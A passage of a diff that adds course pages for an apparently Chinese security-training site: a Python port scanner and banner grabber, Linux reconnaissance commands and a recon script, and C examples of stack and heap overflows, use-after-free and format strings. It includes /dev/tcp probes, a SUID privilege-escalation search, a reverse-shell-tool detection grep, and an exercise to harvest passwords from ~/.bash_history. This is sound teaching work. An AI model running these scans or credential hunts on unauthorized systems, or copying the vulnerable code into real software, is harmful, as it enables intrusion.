sock.connect((target_ip, port))\r\n        result[\"is_open\"] = True\r\n        if port in (80, 8080):\r\n            sock.send(f\"HEAD / HTTP/1.0\\r\\nHost: {target_ip}\\r\\n\\r\\n\".encode())\r\n        try:\r\n            data = sock.recv(4096)\r\n            if data:\r\n                result[\"banner\"] = data.decode(\"utf-8\", errors=\"ignore\").strip().split(\"\\n\")[0]\r\n        except socket.timeout:\r\n            result[\"banner\"] = \"(无 Banner)\"\r\n    except socket.timeout:\r\n        result[\"error\"] = \"超时\"\r\n    except ConnectionRefusedError:\r\n        result[\"error\"] = \"拒绝\"\r\n    except OSError as e:\r\n        result[\"error\"] = str(e)\r\n    finally:\r\n        sock.close()\r\n    return result\r\n\r\nfor ip, port in [(\"scanme.nmap.org\", 22), (\"scanme.nmap.org\", 80)]:\r\n    r = grab_banner(ip, port)\r\n    s = \"OPEN\" if r[\"is_open\"] else \"CLOSED\"\r\n    b = r[\"banner\"][:50] if r[\"banner\"] else r[\"error\"] or \"N/A\"\r\n    print(f\"[{s:6s}] {ip}:{port} → {b}\")</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p><code>scanme.nmap.org</code> 是合法的测试主机。不要对未授权目标进行扫描。</p>\r\n</div>\r\n\r\n<h3>TCP vs UDP 扫描</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def tcp_scan(ip, port, timeout=3.0):\r\n    \"\"\"TCP 全连接扫描\"\"\"\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.settimeout(timeout)\r\n    try:\r\n        sock.connect((ip, port))\r\n        return \"open\"\r\n    except (socket.timeout, ConnectionRefusedError):\r\n        return \"closed\"\r\n    finally:\r\n        sock.close()\r\n\r\ndef udp_scan(ip, port, timeout=3.0):\r\n    \"\"\"UDP 扫描（不太可靠）\"\"\"\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\n    sock.settimeout(timeout)\r\n    try:\r\n        sock.sendto(b\"\", (ip, port))\r\n        sock.recvfrom(4096)\r\n        return \"open\"\r\n    except socket.timeout:\r\n        return \"open|filtered\"  # 无法区分\r\n    except ConnectionRefusedError:\r\n        return \"closed\"\r\n    finally:\r\n        sock.close()</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>Port Scanner v2.0</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"Port Scanner v2.0\"\"\"\r\nimport socket, time\r\n\r\nclass PortScanner:\r\n    def __init__(self, timeout=2.0):\r\n        self.timeout = timeout\r\n\r\n    def scan_tcp(self, target_ip, ports, verbose=True):\r\n        print(f\"[*] TCP 扫描 {target_ip} ({len(ports)} 端口)\")\r\n        start = time.time()\r\n        open_ports = []\r\n        for port in ports:\r\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            sock.settimeout(self.timeout)\r\n            try:\r\n                sock.connect((target_ip, port))\r\n                banner = \"\"\r\n                try:\r\n                    if port in (80, 8080):\r\n                        sock.send(f\"HEAD / HTTP/1.0\\r\\nHost: {target_ip}\\r\\n\\r\\n\".encode())\r\n                    data = sock.recv(1024)\r\n                    banner = data.decode(\"utf-8\", errors=\"ignore\").strip()[:60]\r\n                except: pass\r\n                open_ports.append({\"port\": port, \"banner\": banner})\r\n                if verbose:\r\n                    print(f\"  [+] {port}/tcp open  {banner}\")\r\n            except: pass\r\n            finally:\r\n                sock.close()\r\n        elapsed = time.time() - start\r\n        print(f\"[*] 完成: {len(open_ports)} 个开放端口, {elapsed:.1f}s\")\r\n        return open_ports\r\n\r\nscanner = PortScanner(timeout=2.0)\r\nscanner.scan_tcp(\"scanme.nmap.org\", [21, 22, 80, 443, 3306, 8080])</code></pre></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(1)\">▶ 打开编程练习：端口扫描器</button>\r\n\r\n<h3>DNS 解析与安全</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import socket\r\n\r\ndef resolve_domain(domain):\r\n    try:\r\n        ip = socket.gethostbyname(domain)\r\n        print(f\"{domain} → {ip}\")\r\n        return ip\r\n    except socket.gaierror as e:\r\n        print(f\"DNS 失败: {e}\")\r\n        return None\r\n\r\ndef verify_dns(domain, expected_ips):\r\n    \"\"\"检测 DNS 劫持\"\"\"\r\n    results = socket.getaddrinfo(domain, None)\r\n    resolved = set(sa[0] for *_, sa in results)\r\n    unexpected = resolved - set(expected_ips)\r\n    if unexpected:\r\n        print(f\"⚠️ DNS 劫持: {domain} → {unexpected}\")\r\n        return False\r\n    print(f\"✅ DNS 正常\")\r\n    return True</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>未经授权的端口扫描在很多国家是违法行为。只扫描你拥有或有书面授权的目标。</p>\r\n</div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给 Port Scanner 添加\"服务指纹\"功能：对开放的 HTTP 端口解析响应头中的 <code>Server</code> 字段，识别 Web 服务器类型。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>Socket</strong> 是网络编程基础——TCP 面向连接，UDP 无连接</li>\r\n<li>用 <code>socket.connect()</code> 实现真正的端口探测</li>\r\n<li>DNS 解析的安全风险</li>\r\n<li>完成了 <strong>Port Scanner v2.0</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-03"] = "<!-- ============================================================= -->\r\n\r\n<h2>Linux 命令速查</h2>\r\n<h3>prog-03 · Shell脚本实战 · 命令行的力量</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>网络编程</strong>——用 Python socket 实现了端口扫描。但在真实安全工作中，你有一半时间是在 Linux 命令行里度过的。快速查日志、改配置、跑脚本——这些都靠 Shell。本章我们用 Shell 脚本构建一个<strong>系统侦察工具</strong>。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你拿到了一台 Linux 服务器的 SSH 权限（经授权的安全评估）。导师说：\"做一轮系统侦察——操作系统版本、开放端口、可疑登录记录。用脚本自动化。\"</p>\r\n</div>\r\n\r\n<h3>文件与目录操作</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># === 目录浏览 ===\r\nls -lah                  # 详细列表，含隐藏文件\r\nls -latr                 # 按修改时间排序\r\n\r\n# === 查找文件 ===\r\nfind /etc -name \"*.conf\" -type f 2>/dev/null          # 配置文件\r\nfind / -mtime -1 -type f 2>/dev/null | head -50       # 24小时内修改的文件\r\nfind / -perm -4000 -type f 2>/dev/null                # SUID 文件（提权向量）\r\nfind / -writable -type d 2>/dev/null | grep -v proc   # 可写目录\r\n\r\n# === 查看文件 ===\r\ncat /etc/passwd                    # 用户列表\r\nhead -20 /var/log/auth.log         # 日志前 20 行\r\ntail -f /var/log/syslog            # 实时监控\r\nwc -l /var/log/auth.log            # 行数统计\r\ndu -sh /var/log/*                  # 文件大小</code></pre></div>\r\n\r\n<h3>文本处理三剑客：grep、awk、sed</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># === grep：搜索 ===\r\ngrep \"Failed password\" /var/log/auth.log           # 失败的 SSH 登录\r\ngrep -in \"error\" /var/log/syslog                   # 忽略大小写 + 行号\r\ngrep -c \"Failed password\" /var/log/auth.log        # 计数\r\ngrep -r \"password\" /etc/ 2>/dev/null               # 递归搜索目录\r\n\r\n# === awk：提取列 ===\r\n# 提取失败登录的 IP 并统计 Top 10\r\ngrep \"Failed password\" /var/log/auth.log | \\\r\n    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10\r\n\r\n# === sed：替换 ===\r\n# IP 脱敏\r\nsed 's/[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}/X.X.X.X/g' access.log\r\n# 删除空行\r\nsed '/^$/d' config.txt\r\n# 提取第 10-20 行\r\nsed -n '10,20p' large_log.txt</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>管道与重定向</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 管道链：找 SSH 暴力破解 IP Top 10\r\ngrep \"Failed password\" /var/log/auth.log | \\\r\n    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10\r\n\r\n# 输出重定向\r\necho \"扫描报告\" > report.txt        # 覆盖\r\necho \"新发现\" >> report.txt         # 追加\r\npython3 scanner.py 2>&1 | tee scan.log  # 同时显示和保存\r\n\r\n# Here Document\r\ncat << EOF > /tmp/scan_config.txt\r\ntarget=192.168.1.0/24\r\nports=22,80,443,3306\r\ntimeout=3\r\nEOF</code></pre></div>\r\n\r\n<h3>网络命令</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 网络状态\r\nss -tlnp                          # 监听端口\r\nss -tunap                         # 所有连接\r\nip addr show                      # 网络接口\r\n\r\n# DNS 查询\r\ndig example.com\r\nnslookup example.com\r\n\r\n# HTTP 测试\r\ncurl -I https://example.com       # 只看头部\r\ncurl -v https://example.com       # 详细模式\r\n\r\n# Bash 端口扫描\r\nfor port in 22 80 443 3306 8080; do\r\n    (echo >/dev/tcp/scanme.nmap.org/$port) 2>/dev/null && \\\r\n    echo \"Port $port: OPEN\" || echo \"Port $port: CLOSED\"\r\ndone\r\n\r\n# nmap\r\nnmap -sT -p 1-1000 scanme.nmap.org       # TCP 扫描\r\nnmap -sV scanme.nmap.org                  # 服务版本检测</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>进程与权限检查</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 进程\r\nps aux | grep nginx\r\nps aux | grep -E \"(nc |ncat |socat )\"   # 反弹 shell 工具\r\nps aux | grep -E \"/tmp/|/dev/shm/\"      # 从临时目录运行的程序\r\n\r\n# 用户和登录\r\nwhoami; id\r\ncat /etc/passwd | grep -v nologin        # 有 shell 的用户\r\nlast -20                                  # 最近登录\r\nlastb 2>/dev/null | head -20             # 失败登录\r\nw                                         # 当前在线\r\n\r\n# 安全检查\r\nfind / -perm -4000 -type f 2>/dev/null   # SUID 文件\r\nfind /tmp -type f -executable 2>/dev/null # /tmp 可执行文件\r\ncrontab -l                               # 定时任务\r\ncat /etc/crontab</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>上面很多命令是渗透测试的标准\"信息收集\"步骤。在合法评估中这是工具箱；在未授权环境中就是攻击行为。</p>\r\n</div>\r\n\r\n<h3>Shell 脚本实战：系统侦察</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">#!/bin/bash\r\n# system_recon.sh - 系统侦察脚本\r\nset -euo pipefail\r\n\r\nOUTPUT_DIR=\"/tmp/recon_$(date +%Y%m%d_%H%M%S)\"\r\nmkdir -p \"$OUTPUT_DIR\"\r\n\r\necho \"=== 系统侦察报告 $(date) ===\"\r\n\r\n# 基本信息\r\n{\r\n    echo \"=== 操作系统 ===\"\r\n    cat /etc/os-release 2>/dev/null || uname -a\r\n    echo \"=== 内核 ===\"\r\n    uname -r\r\n    echo \"=== 当前用户 ===\"\r\n    whoami; id\r\n} > \"$OUTPUT_DIR/basic.txt\"\r\n\r\n# 网络信息\r\n{\r\n    echo \"=== 网络接口 ===\"\r\n    ip addr show 2>/dev/null\r\n    echo \"=== 监听端口 ===\"\r\n    ss -tlnp 2>/dev/null || netstat -tlnp\r\n    echo \"=== 活跃连接 ===\"\r\n    ss -tunap 2>/dev/null | head -50\r\n} > \"$OUTPUT_DIR/network.txt\"\r\n\r\n# 安全检查\r\n{\r\n    echo \"=== SUID 文件 ===\"\r\n    find / -perm -4000 -type f 2>/dev/null\r\n    echo \"=== /tmp 可执行文件 ===\"\r\n    find /tmp -type f -executable 2>/dev/null\r\n    echo \"=== 定时任务 ===\"\r\n    crontab -l 2>/dev/null\r\n    cat /etc/crontab 2>/dev/null\r\n} > \"$OUTPUT_DIR/security.txt\"\r\n\r\necho \"[+] 完成！报告保存在: $OUTPUT_DIR\"\r\nls -lah \"$OUTPUT_DIR/\"</code></pre></div>\r\n\r\n<h3>Shell 脚本语法速查</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">#!/bin/bash\r\n\r\n# 变量（= 两边不能有空格！）\r\nTARGET=\"192.168.1.1\"\r\nPORTS=(22 80 443 3306 8080)  # 数组\r\n\r\n# 条件\r\nif [ -f \"/etc/passwd\" ]; then\r\n    echo \"passwd 存在\"\r\nfi\r\n\r\n# 循环\r\nfor port in \"${PORTS[@]}\"; do\r\n    echo \"检查 $port...\"\r\ndone\r\n\r\n# 函数\r\ncheck_port() {\r\n    local ip=$1\r\n    local port=$2\r\n    (echo >/dev/tcp/$ip/$port) 2>/dev/null\r\n    return $?\r\n}\r\n\r\nif check_port \"$TARGET\" 80; then\r\n    echo \"80 开放\"\r\nfi</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>Shell 脚本中<strong>命令注入</strong>是最严重的安全漏洞。永远不要把用户输入直接拼接到命令中。用引号包裹变量、验证输入、使用 <code>set -euo pipefail</code>。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给侦察脚本添加检查 <code>~/.bash_history</code> 的功能，找出历史命令中的敏感信息（如明文密码、API 密钥）。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"3\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li>核心命令：<code>find</code>、<code>grep</code>、<code>cat</code>、<code>ls</code></li>\r\n<li>三剑客：<code>grep</code>（搜索）、<code>awk</code>（提取）、<code>sed</code>（替换）</li>\r\n<li>管道把命令串联成分析链</li>\r\n<li>完成了<strong>系统侦察 Shell 脚本</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-04"] = "<!-- ============================================================= -->\r\n\r\n<h2>指针与内存模型</h2>\r\n<h3>prog-04 · C语言安全基础 · 深入机器的内心</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>Linux Shell 脚本</strong>。现在我们换一个维度——从\"使用工具\"下沉到\"理解工具内部\"。Python 帮你管理内存，但 C 语言把控制权完全交给你——而<strong>90% 以上的系统级漏洞</strong>都源于内存管理错误。本章我们构建 <strong>Hex Dump 工具</strong>来透视内存。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你在分析一个可疑的二进制文件。导师说：\"用 hex dump 看看它的头部结构。\" 你需要理解：<strong>内存中的数据什么样？指针是什么？为什么缓冲区溢出能导致代码执行？</strong></p>\r\n</div>\r\n\r\n<h3>内存是什么？</h3>\r\n\r\n<p>把内存想象一排带编号的<strong>储物柜</strong>：每个柜子 1 字节，编号就是<strong>地址</strong>，柜子里的东西就是<strong>数据</strong>，<strong>指针</strong>就是写着地址的纸条。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n\r\nint main() {\r\n    int x = 42;          // 分配 4 字节\r\n    char c = 'A';        // 分配 1 字节\r\n    double d = 3.14;     // 分配 8 字节\r\n\r\n    printf(\"x: 值=%d, 地址=%p, 大小=%lu\\n\", x, (void*)&x, sizeof(x));\r\n    printf(\"c: 值=%c, 地址=%p, 大小=%lu\\n\", c, (void*)&c, sizeof(c));\r\n    printf(\"d: 值=%.2f, 地址=%p, 大小=%lu\\n\", d, (void*)&d, sizeof(d));\r\n    return 0;\r\n}</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>指针：拿着地址的纸条</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <string.h>\r\n\r\nint main() {\r\n    int value = 100;\r\n    int *ptr = &value;    // ptr 保存 value 的地址\r\n\r\n    printf(\"value = %d\\n\", value);          // 100\r\n    printf(\"ptr (地址) = %p\\n\", (void*)ptr);\r\n    printf(\"*ptr (解引用) = %d\\n\", *ptr);   // 100\r\n\r\n    *ptr = 200;  // 通过指针修改值\r\n    printf(\"value = %d\\n\", value);           // 200!\r\n\r\n    // 指针与数组\r\n    char buffer[16] = \"Hello, World!\";\r\n    char *p = buffer;  // 数组名 = 首元素地址\r\n\r\n    printf(\"首字符: %c\\n\", *p);\r\n    printf(\"第8个字符: %c\\n\", *(p + 7));\r\n\r\n    p += 7;\r\n    printf(\"移动后: %s\\n\", p);  // \"World!\"\r\n\r\n    return 0;\r\n}</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>指针算术非常危险——让指针移出分配范围后解引用，就是<strong>读写未授权内存</strong>，这是很多安全漏洞的根源。</p>\r\n</div>\r\n\r\n<h3>内存布局</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">高地址\r\n┌──────────────────────┐\r\n│    栈 (Stack)    ↓    │  局部变量、返回地址\r\n├──────────────────────┤\r\n│         ↓↑           │  栈和堆相向生长\r\n├──────────────────────┤\r\n│    堆 (Heap)    ↑    │  malloc() 动态分配\r\n├──────────────────────┤\r\n│   BSS (未初始化)      │  全局变量（自动清零）\r\n├──────────────────────┤\r\n│   Data (已初始化)     │  全局/静态变量\r\n├──────────────────────┤\r\n│   Text (代码段)       │  程序指令（只读）\r\n└──────────────────────┘\r\n低地址</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\nint global_var = 42;       // Data 段\r\nint bss_var;               // BSS 段\r\n\r\nvoid show_layout() {\r\n    int stack_var = 100;            // 栈\r\n    char *heap_buf = malloc(64);    // 堆\r\n    strcpy(heap_buf, \"heap data\");\r\n\r\n    printf(\"代码段: %p\\n\", (void*)show_layout);\r\n    printf(\"Data段: %p\\n\", (void*)&global_var);\r\n    printf(\"BSS段:  %p\\n\", (void*)&bss_var);\r\n    printf(\"堆:     %p\\n\", (void*)heap_buf);\r\n    printf(\"栈:     %p\\n\", (void*)&stack_var);\r\n\r\n    free(heap_buf);\r\n}\r\n\r\nint main() {\r\n    show_layout();\r\n    return 0;\r\n}</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>实战：Hex Dump 工具</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">/* hexdump.c - 十六进制转储工具 */\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <ctype.h>\r\n\r\n#define WIDTH 16\r\n\r\nvoid hexdump(FILE *fp) {\r\n    unsigned char buf[WIDTH];\r\n    size_t offset = 0;\r\n    size_t n;\r\n\r\n    while ((n = fread(buf, 1, WIDTH, fp)) > 0) {\r\n        // 偏移量\r\n        printf(\"%08zx  \", offset);\r\n\r\n        // 十六进制\r\n        for (size_t i = 0; i < WIDTH; i++) {\r\n            if (i < n) printf(\"%02x \", buf[i]);\r\n            else       printf(\"   \");\r\n            if (i == WIDTH/2 - 1) printf(\" \");\r\n        }\r\n\r\n        // ASCII\r\n        printf(\" |\");\r\n        for (size_t i = 0; i < n; i++)\r\n            putchar(isprint(buf[i]) ? buf[i] : '.');\r\n        printf(\"|\\n\");\r\n\r\n        offset += n;\r\n    }\r\n    printf(\"%08zx  (共 %zu 字节)\\n\", offset, offset);\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n    if (argc < 2) {\r\n        fprintf(stderr, \"用法: %s <文件>\\n\", argv[0]);\r\n        return 1;\r\n    }\r\n    FILE *fp = fopen(argv[1], \"rb\");\r\n    if (!fp) { perror(\"无法打开\"); return 1; }\r\n\r\n    hexdump(fp);\r\n    fclose(fp);\r\n    return 0;\r\n}</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>编译运行：<code>gcc -o hexdump hexdump.c && ./hexdump /bin/ls</code>。文件头 <code>7f 45 4c 46</code> 就是 ELF 格式魔数。</p>\r\n</div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(4)\">▶ 打开编程练习：C 指针</button>\r\n\r\n<h3>危险的字符串操作</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\nvoid demo() {\r\n    char buffer[16];\r\n\r\n    // ❌ 危险函数（不检查边界）\r\n    // gets(buffer);                              // 已移除出标准\r\n    // strcpy(buffer, \"很长的字符串...\");           // 溢出！\r\n    // sprintf(buffer, \"User: %s\", long_name);    // 溢出！\r\n\r\n    // ✅ 安全替代\r\n    // fgets(buffer, sizeof(buffer), stdin);\r\n\r\n    char dest[16];\r\n    strncpy(dest, \"Hello!\", sizeof(dest) - 1);\r\n    dest[sizeof(dest) - 1] = '\\0';  // 手动终止\r\n\r\n    char msg[64];\r\n    snprintf(msg, sizeof(msg), \"User: %s from %s\", \"admin\", \"10.0.0.1\");\r\n    printf(\"%s\\n\", msg);\r\n}\r\n\r\n// 指针越界\r\nvoid pointer_danger() {\r\n    int arr[5] = {10, 20, 30, 40, 50};\r\n    int *p = arr;\r\n\r\n    printf(\"arr[0] = %d\\n\", *p);        // 10\r\n    printf(\"arr[4] = %d\\n\", *(p + 4));  // 50\r\n    // ❌ 未定义行为！\r\n    // printf(\"arr[100] = %d\\n\", *(p + 100));  // 崩溃或读到敏感数据\r\n}</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>C 语言<strong>不做边界检查</strong>。指针可以指向任何地址——程序员必须自己保证安全，而人总会犯错。</p>\r\n</div>\r\n\r\n<h3>函数调用栈与返回地址</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">函数 func() 调用时的栈帧:\r\n\r\n┌──────────────────────┐\r\n│  局部变量 (buffer)    │  ← 缓冲区在这里\r\n├──────────────────────┤\r\n│  保存的 EBP           │  ← 帧指针\r\n├──────────────────────┤\r\n│  返回地址             │  ← ⚠️ 攻击目标！\r\n├──────────────────────┤\r\n│  参数                 │\r\n│  调用者栈帧           │\r\n└──────────────────────┘\r\n\r\nbuffer 溢出 → 覆盖返回地址 → 劫持程序执行！</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给 Hex Dump 工具增加搜索功能：接受十六进制模式（如 <code>4d5a</code>），找到文件中所有匹配位置。这在分析 PE 文件时特别有用。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>指针</strong>存储内存地址，是 C 的灵魂也是漏洞温床</li>\r\n<li>内存布局：代码段、数据段、堆、栈各有安全特性</li>\r\n<li>C 字符串函数不检查边界</li>\r\n<li>栈溢出覆盖返回地址 = 代码执行</li>\r\n<li>完成了 <strong>Hex Dump 工具</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-04-02"] = "<!-- ============================================================= -->\r\n\r\n<h2>常见内存漏洞模式</h2>\r\n<h3>prog-04 · C语言安全基础 · 漏洞的解剖学</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>指针与内存模型</strong>。本章我们系统梳理四种最常见的内存漏洞模式，用 C 代码<strong>亲眼看到</strong>漏洞如何产生。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你在审计一个开源 C 语言服务。导师说：\"这段代码有漏洞，能找出来吗？\" 你需要掌握<strong>漏洞模式识别</strong>能力。</p>\r\n</div>\r\n\r\n<h3>漏洞模式一：栈缓冲区溢出</h3>\r\n\r\n<p>原理：向栈上固定缓冲区写入超量数据，覆盖相邻内存（包括返回地址）。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <string.h>\r\n\r\n// ===== 漏洞代码 =====\r\nvoid vulnerable_login(char *username) {\r\n    char user_buf[32];    // 只能存 31 字符 + \\0\r\n    int is_admin = 0;     // 认证标志\r\n\r\n    printf(\"user_buf 地址: %p\\n\", (void*)user_buf);\r\n    printf(\"is_admin 地址: %p\\n\", (void*)&is_admin);\r\n\r\n    // 漏洞：不检查长度\r\n    strcpy(user_buf, username);\r\n\r\n    if (is_admin) {  // 溢出可能覆盖 is_admin！\r\n        printf(\"🔓 管理员登录！\\n\");\r\n    } else {\r\n        printf(\"🔒 普通用户\\n\");\r\n    }\r\n}\r\n\r\n// ===== 安全版本 =====\r\nvoid safe_login(char *username) {\r\n    char user_buf[32];\r\n    strncpy(user_buf, username, sizeof(user_buf) - 1);\r\n    user_buf[sizeof(user_buf) - 1] = '\\0';\r\n    printf(\"用户: %s\\n\", user_buf);\r\n}</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>现代编译器默认启用<strong>栈保护</strong>（Stack Canary）。溢出覆盖 Canary 值后程序会主动崩溃。学习时可用 <code>gcc -fno-stack-protector</code> 关闭。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>漏洞模式二：堆缓冲区溢出</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\nstruct UserProfile {\r\n    char name[32];\r\n    int privilege_level;  // 0=普通, 1=管理员\r\n};\r\n\r\nvoid heap_overflow_demo(char *input) {\r\n    struct UserProfile *p = malloc(sizeof(struct UserProfile));\r\n    p->privilege_level = 0;\r\n    memset(p->name, 0, 32);\r\n\r\n    // 漏洞：不检查 input 长度\r\n    strcpy(p->name, input);\r\n\r\n    // 溢出可能覆盖 privilege_level\r\n    printf(\"权限: %d\\n\", p->privilege_level);\r\n    if (p->privilege_level > 0)\r\n        printf(\"🔓 权限提升！等级: %d\\n\", p->privilege_level);\r\n\r\n    free(p);\r\n}\r\n\r\n// 安全版本\r\nstruct UserProfile *safe_create(const char *name) {\r\n    struct UserProfile *p = malloc(sizeof(struct UserProfile));\r\n    if (!p) return NULL;\r\n    p->privilege_level = 0;\r\n    strncpy(p->name, name, sizeof(p->name) - 1);\r\n    p->name[sizeof(p->name) - 1] = '\\0';\r\n    return p;\r\n}</code></pre></div>\r\n\r\n<h3>漏洞模式三：Use-After-Free</h3>\r\n\r\n<p>释放内存后继续使用——现代浏览器漏洞中最常见的类型。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\nstruct Session {\r\n    char *token;\r\n    int is_valid;\r\n};\r\n\r\nvoid uaf_demo() {\r\n    struct Session *s = malloc(sizeof(struct Session));\r\n    s->token = strdup(\"SECRET_TOKEN\");\r\n    s->is_valid = 1;\r\n\r\n    printf(\"创建: token=%s valid=%d\\n\", s->token, s->is_valid);\r\n\r\n    // 释放\r\n    free(s->token);\r\n    free(s);\r\n    printf(\"已释放\\n\");\r\n\r\n    // ❌ 漏洞：释放后使用\r\n    // 新分配可能占据同一内存\r\n    char *new_data = malloc(sizeof(struct Session));\r\n    strcpy(new_data, \"ATTACKER_DATA\");\r\n\r\n    // 通过旧指针访问 → 读到攻击者控制的数据\r\n    printf(\"旧指针: valid=%d\\n\", s->is_valid);  // 未定义行为！\r\n}\r\n\r\n// 防御方法\r\nvoid safe_free(struct Session **s) {\r\n    if (*s) {\r\n        free((*s)->token);\r\n        (*s)->token = NULL;   // ✅ 置空\r\n        free(*s);\r\n        *s = NULL;            // ✅ 置空\r\n    }\r\n}</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>Use-After-Free 是 Chrome、iOS 内核最常见漏洞。防御铁律：<strong>释放后立即置 NULL</strong>。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>漏洞模式四：格式化字符串</h3>\r\n\r\n<p>用户输入被直接作为 <code>printf</code> 格式字符串时，攻击者可读取/写入任意内存。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">#include <stdio.h>\r\n\r\nint secret = 0xDEADBEEF;\r\n\r\nvoid vulnerable_log(char *input) {\r\n    // ❌ 用户输入直接当格式字符串\r\n    printf(input);\r\n    // 输入 